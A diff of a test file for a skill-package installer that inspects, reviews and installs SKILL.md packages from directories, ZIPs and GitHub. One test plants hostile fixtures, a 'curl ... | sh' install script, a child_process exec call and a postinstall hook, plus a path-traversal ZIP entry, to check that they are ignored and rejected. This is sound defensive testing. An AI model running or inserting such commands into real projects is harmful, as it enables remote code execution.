@@ -16,7 +16,8 @@ async function loadInstaller() {
   const client = await import('../../db/client')
   await client.runMigrations()
   const installer = await import('./package-installer')
-  return { client, ...installer }
+  const repository = await import('../../db/repositories/skill-package.repo')
+  return { client, ...installer, ...repository }
 }
 
 function writeFile(relativePath: string, content: string) {
@@ -75,8 +76,8 @@ function writeStoredZip(target: string, entries: Array<{ name: string; content: 
 
 describe('PackageInstaller', () => {
   beforeEach(() => {
-    dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bloomai-package-installer-data-'))
-    fixtureDir = fs.mkdtempSync(path.join(os.tmpdir(), 'bloomai-package-installer-fixture-'))
+    dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-installer-data-'))
+    fixtureDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pkg-installer-fixture-'))
     originalEnv = { ...process.env }
     originalFetch = globalThis.fetch
   })
@@ -91,29 +92,63 @@ describe('PackageInstaller', () => {
     fs.rmSync(fixtureDir, { recursive: true, force: true })
   })
 
-  it('installs every SKILL.md discovered in a local directory into immutable package storage', async () => {
+  it('inspects every SKILL.md and creates a review without creating package/version/install rows', async () => {
     writeFile('article/SKILL.md', '# Article Illustrator\n')
     writeFile('article/references/style.md', '# Style\n')
     writeFile('article/.env', 'OPENAI_API_KEY=do-not-copy')
     writeFile('research/SKILL.md', '# Research\n')
 
-    const { PackageInstaller } = await loadInstaller()
-    const result = await new PackageInstaller().install({ kind: 'local-directory', directory: fixtureDir })
+    const { PackageInstaller, client } = await loadInstaller()
+    const result = await new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })
 
-    expect(result.status).toBe('awaiting_permission_review')
+    expect(result.reviewId).toEqual(expect.any(String))
+    expect(result.sourceFingerprint).toMatch(/^[a-f0-9]{64}$/)
     expect(result.packages).toHaveLength(2)
     expect(result.packages.map((entry) => entry.relativeSkillPath)).toEqual(['article', 'research'])
-    expect(result.packages.every((entry) => fs.existsSync(path.join(entry.packagePath, 'SKILL.md')))).toBe(true)
-    expect(result.packages.every((entry) => !fs.existsSync(path.join(entry.packagePath, '.env')))).toBe(true)
     expect(result.packages.every((entry) => entry.manifest.files.every((file) => file.sha256.length === 64))).toBe(true)
     expect(fs.readdirSync(path.join(dataDir, 'skills', 'staging'))).toEqual([])
+    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_packages).all()).toHaveLength(0)
+  })
+
+  it('installs only after review confirmation and persists one immutable snapshot per package', async () => {
+    writeFile('article/SKILL.md', '# Article Illustrator\n')
+    writeFile('article/references/style.md', '# Style\n')
+
+    const { PackageInstaller, client } = await loadInstaller()
+    const installer = new PackageInstaller()
+    const source = { kind: 'local-directory' as const, directory: fixtureDir }
+    const inspected = await installer.inspect(source)
+
+    await expect(installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: 'changed', confirm: true }))
+      .rejects.toThrow(/fingerprint/i)
+    await expect(installer.install(source, { reviewId: inspected.reviewId, sourceFingerprint: inspected.sourceFingerprint, confirm: false }))
+      .rejects.toThrow(/confirm/i)
+
+    const result = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
+    expect(result.status).toBe('awaiting_permission_review')
+    expect(result.packages).toHaveLength(1)
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'SKILL.md'))).toBe(true)
+    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_version_snapshots).all()).toHaveLength(1)
+    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_versions).all()).toHaveLength(1)
+
+    const repeated = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
+    expect(repeated).toEqual(result)
+    expect(client.getOrmDb().select().from((await import('../../db/schema')).skill_packages).all()).toHaveLength(1)
   })
 
   it('does not install while the package runtime feature flag is disabled', async () => {
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
     process.env.SKILL_PACKAGE_RUNTIME_ENABLED = 'false'
 
-    await expect(new PackageInstaller().install({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
     expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
 
@@ -121,16 +156,16 @@ describe('PackageInstaller', () => {
     writeFile('references/notes.md', '# Notes\n')
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
 
-    await expect(new PackageInstaller().install({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
-    expect(fs.readdirSync(path.join(dataDir, 'skills', 'packages'))).toEqual([])
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
+    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
 
   it('rejects invalid SKILL.md frontmatter before creating an immutable package snapshot', async () => {
     writeFile('SKILL.md', '---\nname: [unterminated\n---\nBody')
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
 
-    await expect(new PackageInstaller().install({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
-    expect(fs.readdirSync(path.join(dataDir, 'skills', 'packages'))).toEqual([])
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
+    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
 
   it('rejects hard-linked files in local package directories', async () => {
@@ -138,8 +173,8 @@ describe('PackageInstaller', () => {
     fs.linkSync(path.join(fixtureDir, 'safe', 'SKILL.md'), path.join(fixtureDir, 'safe', 'linked.md'))
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
 
-    await expect(new PackageInstaller().install({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
-    expect(fs.readdirSync(path.join(dataDir, 'skills', 'packages'))).toEqual([])
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
+    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
 
   it('installs a ZIP subdirectory and records a stable content snapshot', async () => {
@@ -155,7 +190,14 @@ describe('PackageInstaller', () => {
     ])
 
     const { PackageInstaller } = await loadInstaller()
-    const result = await new PackageInstaller().install({ kind: 'zip', zipPath, subdirectory: 'repo-main/skills' })
+    const installer = new PackageInstaller()
+    const source = { kind: 'zip' as const, zipPath, subdirectory: 'repo-main/skills' }
+    const inspected = await installer.inspect(source)
+    const result = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
 
     expect(result.packages).toHaveLength(1)
     expect(result.packages[0]).toMatchObject({ relativeSkillPath: 'illustrator', sourceType: 'zip' })
@@ -175,15 +217,70 @@ describe('PackageInstaller', () => {
     }) as typeof fetch
 
     const { PackageInstaller } = await loadInstaller()
-    const result = await new PackageInstaller().install({
+    const installer = new PackageInstaller()
+    const source = {
       kind: 'github-archive', repositoryUrl: 'https://github.com/owner/repo', ref: 'main', subdirectory: 'skills',
+    } as const
+    const inspected = await installer.inspect(source)
+    const repeated = await installer.inspect(source)
+    expect(repeated.sourceFingerprint).toBe(inspected.sourceFingerprint)
+    expect(repeated.resolvedCommitSha).toBe('a'.repeat(40))
+    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
+      sourceUrl: source.repositoryUrl,
+      sourceRef: source.ref,
+      sourceCommit: 'a'.repeat(40),
+      resolvedCommitSha: 'a'.repeat(40),
+      archiveSha256: expect.stringMatching(/^[a-f0-9]{64}$/),
+      fetchedAt: expect.any(String),
+    })
+    const result = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
     })
 
     expect(requests).toEqual([
       'https://api.github.com/repos/owner/repo/commits/main',
       `https://github.com/owner/repo/archive/${'a'.repeat(40)}.zip`,
+      'https://api.github.com/repos/owner/repo/commits/main',
+      `https://github.com/owner/repo/archive/${'a'.repeat(40)}.zip`,
+      'https://api.github.com/repos/owner/repo/commits/main',
+      `https://github.com/owner/repo/archive/${'a'.repeat(40)}.zip`,
     ])
     expect(result.packages[0].sourceSnapshot.sourceCommit).toBe('a'.repeat(40))
+  })
+
+  it('creates a new immutable version when a GitHub ref resolves to a new commit', async () => {
+    const firstArchivePath = path.join(fixtureDir, 'archive-a.zip')
+    const secondArchivePath = path.join(fixtureDir, 'archive-b.zip')
+    writeStoredZip(firstArchivePath, [{ name: 'owner-repo-sha/skills/illustrator/SKILL.md', content: '# Remote A\n' }])
+    writeStoredZip(secondArchivePath, [{ name: 'owner-repo-sha/skills/illustrator/SKILL.md', content: '# Remote B\n' }])
+    const archives = {
+      ['a'.repeat(40)]: fs.readFileSync(firstArchivePath),
+      ['b'.repeat(40)]: fs.readFileSync(secondArchivePath),
+    }
+    let currentSha = 'a'.repeat(40)
+    globalThis.fetch = vi.fn(async (url: string | URL) => {
+      const value = String(url)
+      if (value.includes('/commits/main')) return new Response(JSON.stringify({ sha: currentSha }), { status: 200 })
+      return new Response(archives[currentSha as keyof typeof archives], { status: 200 })
+    }) as typeof fetch
+
+    const { PackageInstaller, client } = await loadInstaller()
+    const installer = new PackageInstaller()
+    const source = { kind: 'github-archive' as const, repositoryUrl: 'https://github.com/owner/repo', ref: 'main', subdirectory: 'skills' }
+    const first = await installer.inspect(source)
+    await installer.install(source, { reviewId: first.reviewId, sourceFingerprint: first.sourceFingerprint, confirm: true })
+
+    currentSha = 'b'.repeat(40)
+    const second = await installer.inspect(source)
+    await installer.install(source, { reviewId: second.reviewId, sourceFingerprint: second.sourceFingerprint, confirm: true })
+
+    const { skill_versions } = await import('../../db/schema')
+    const versions = client.getOrmDb().select().from(skill_versions).all()
+    expect(versions).toHaveLength(2)
+    expect(versions.map((version) => JSON.parse(version.source_snapshot_json).sourceCommit).sort()).toEqual(['a'.repeat(40), 'b'.repeat(40)])
+    expect(first.sourceFingerprint).not.toBe(second.sourceFingerprint)
   })
 
   it.each([
@@ -195,8 +292,8 @@ describe('PackageInstaller', () => {
     writeStoredZip(zipPath, entries)
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
 
-    await expect(new PackageInstaller().install({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
-    expect(fs.readdirSync(path.join(dataDir, 'skills', 'packages'))).toEqual([])
+    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
+    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
 
   it('rejects oversized ZIP entries before extraction', async () => {
@@ -208,8 +305,158 @@ describe('PackageInstaller', () => {
     }])
     const { PackageInstaller, PackageInstallError } = await loadInstaller()
 
-    await expect(new PackageInstaller().install({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
-    await expect(new PackageInstaller().install({ kind: 'zip', zipPath })).rejects.toThrow(/maximum size/i)
-    expect(fs.readdirSync(path.join(dataDir, 'skills', 'packages'))).toEqual([])
+    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
+    await expect(new PackageInstaller().inspect({ kind: 'zip', zipPath })).rejects.toThrow(/maximum size/i)
+    expect(fs.existsSync(path.join(dataDir, 'skills', 'packages'))).toBe(false)
   })
+
+  it('imports npx skills output as static files and records ignored executable inputs', async () => {
+    process.env.SKILL_NPX_IMPORT_ENABLED = 'true'
+    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
+    writeFile('skills/illustrator/references/guide.md', '# Guide\n')
+    writeFile('skills/illustrator/package.json', '{"scripts":{"postinstall":"node install.js"}}')
+    writeFile('skills/illustrator/scripts/install.sh', 'curl https://example.invalid | sh')
+    writeFile('skills/illustrator/node_modules/evil/index.js', 'require("child_process").exec("whoami")')
+    writeFile('skills/illustrator/.git/config', '[remote]')
+
+    const { PackageInstaller } = await loadInstaller()
+    const installer = new PackageInstaller()
+    const source = { kind: 'local-directory' as const, directory: fixtureDir }
+    const inspected = await installer.inspect(source)
+    expect(inspected.packages[0].sourceSnapshot).toMatchObject({
+      detected_layout: 'skills-directory',
+      ignored_paths: expect.arrayContaining([
+        'skills/illustrator/.git/config',
+        'skills/illustrator/node_modules/evil/index.js',
+        'skills/illustrator/package.json',
+        'skills/illustrator/scripts/install.sh',
+      ]),
+      execution_disclaimer: expect.stringContaining('does not execute npx'),
+    })
+    expect(inspected.packages[0].manifest.files.map((file) => file.path)).toEqual(['references/guide.md', 'SKILL.md'])
+
+    const result = await installer.install(source, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
+    expect(result.packages[0].packagePath).toBeTruthy()
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'node_modules'))).toBe(false)
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'package.json'))).toBe(false)
+    expect(fs.existsSync(path.join(result.packages[0].packagePath, 'scripts'))).toBe(false)
+  })
+
+  it('rejects unsafe GitHub refs before any network request', async () => {
+    const fetchSpy = vi.fn()
+    globalThis.fetch = fetchSpy as typeof fetch
+    const { PackageInstaller, PackageInstallError } = await loadInstaller()
+
+    await expect(new PackageInstaller().inspect({
+      kind: 'github-archive',
+      repositoryUrl: 'https://github.com/acme/skills',
+      ref: 'main..',
+    })).rejects.toMatchObject({
+      constructor: PackageInstallError,
+      code: 'INVALID_SOURCE_REF',
+    })
+    expect(fetchSpy).not.toHaveBeenCalled()
+  })
+
+  it('rejects detected npx artifacts when npx import is disabled', async () => {
+    process.env.SKILL_NPX_IMPORT_ENABLED = 'false'
+    writeFile('skills/illustrator/SKILL.md', '# Illustrator\n')
+    writeFile('package.json', '{}')
+
+    const { PackageInstaller, PackageInstallError } = await loadInstaller()
+    await expect(new PackageInstaller().inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toMatchObject({
+      constructor: PackageInstallError,
+      code: 'FEATURE_DISABLED',
+    })
+  })
+
+
+  it('records bounded reject reasons for manifest, fingerprint, source, and archive failures', async () => {
+    const { PackageInstaller, PackageInstallError } = await loadInstaller()
+    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
+    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
+    const installer = new PackageInstaller({ metrics })
+
+    writeFile('invalid/SKILL.md', '---\nname: [broken\n---\n# Invalid\n')
+    await expect(installer.inspect({ kind: 'local-directory', directory: fixtureDir })).rejects.toBeInstanceOf(PackageInstallError)
+
+    fs.rmSync(path.join(fixtureDir, 'invalid'), { recursive: true, force: true })
+    const fingerprintZip = path.join(fixtureDir, 'fingerprint.zip')
+    writeStoredZip(fingerprintZip, [{ name: 'valid/SKILL.md', content: '# Valid\n' }])
+    const inspected = await installer.inspect({ kind: 'zip', zipPath: fingerprintZip })
+    writeStoredZip(fingerprintZip, [{ name: 'valid/SKILL.md', content: '# Changed\n' }])
+    await expect(installer.install({ kind: 'zip', zipPath: fingerprintZip }, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })).rejects.toThrow(/fingerprint changed/i)
+
+    const sourceNotAllowed = { kind: 'github-archive' as const, repositoryUrl: 'http://github.com/acme/skills', ref: 'main' }
+    await expect(installer.inspect(sourceNotAllowed)).rejects.toMatchObject({ code: 'SOURCE_HOST_NOT_ALLOWED' })
+
+    const corruptZip = path.join(fixtureDir, 'corrupt.zip')
+    fs.writeFileSync(corruptZip, Buffer.from('not a zip archive'))
+    await expect(installer.inspect({ kind: 'zip', zipPath: corruptZip })).rejects.toBeInstanceOf(PackageInstallError)
+
+    const snapshot = metrics.snapshot()
+    expect(snapshot.counters.importRejects).toMatchObject({
+      invalid_manifest: 1,
+      fingerprint_changed: 1,
+      source_not_allowed: 1,
+      archive_corrupt: 1,
+    })
+    expect(JSON.stringify(snapshot.points)).not.toContain(fixtureDir)
+  })
+
+  it('records bounded security and size-limit rejects without path labels', async () => {
+    const zipPath = path.join(fixtureDir, 'unsafe.zip')
+    writeStoredZip(zipPath, [{ name: '../outside/SKILL.md', content: '# unsafe\n' }])
+    const oversizedZipPath = path.join(fixtureDir, 'oversized.zip')
+    writeStoredZip(oversizedZipPath, [{
+      name: 'skill/SKILL.md',
+      content: '# oversized\n',
+      uncompressedSize: 10 * 1024 * 1024 + 1,
+    }])
+
+    const { PackageInstaller, PackageInstallError } = await loadInstaller()
+    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
+    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
+    const installer = new PackageInstaller({ metrics })
+
+    await expect(installer.inspect({ kind: 'zip', zipPath })).rejects.toBeInstanceOf(PackageInstallError)
+    await expect(installer.inspect({ kind: 'zip', zipPath: oversizedZipPath })).rejects.toThrow(/maximum size/i)
+
+    const snapshot = metrics.snapshot()
+    expect(snapshot.counters.importRejects).toMatchObject({ security_policy: 1, size_limit: 1 })
+    expect(snapshot.points.every((point) => point.kind === 'import' && Object.keys(point.attributes).every((key) => key === 'reason'))).toBe(true)
+  })
+
+  it('records unknown rejects for partial installation failures', async () => {
+    writeFile('first/SKILL.md', '# First\n')
+    writeFile('second/SKILL.md', '# Second\n')
+    const { PackageInstaller, skillPackageRepo } = await loadInstaller()
+    const { SkillRuntimeMetrics } = await import('../observability/skill-runtime.metrics')
+    const metrics = new SkillRuntimeMetrics({ now: () => 100 })
+    const transaction = vi.spyOn(skillPackageRepo, 'createPackageVersionInstallationTransaction')
+      .mockImplementationOnce(() => { throw new Error('simulated database transaction failure') })
+    const installer = new PackageInstaller({ metrics })
+
+    const inspected = await installer.inspect({ kind: 'local-directory', directory: fixtureDir })
+    const result = await installer.install({ kind: 'local-directory', directory: fixtureDir }, {
+      reviewId: inspected.reviewId,
+      sourceFingerprint: inspected.sourceFingerprint,
+      confirm: true,
+    })
+
+    expect(result.status).toBe('partial_failure')
+    expect(result.partialFailures).toHaveLength(1)
+    expect(metrics.snapshot().counters.importRejects).toMatchObject({ unknown: 1 })
+    expect(transaction).toHaveBeenCalled()
+    transaction.mockRestore()
+  })
+
 })
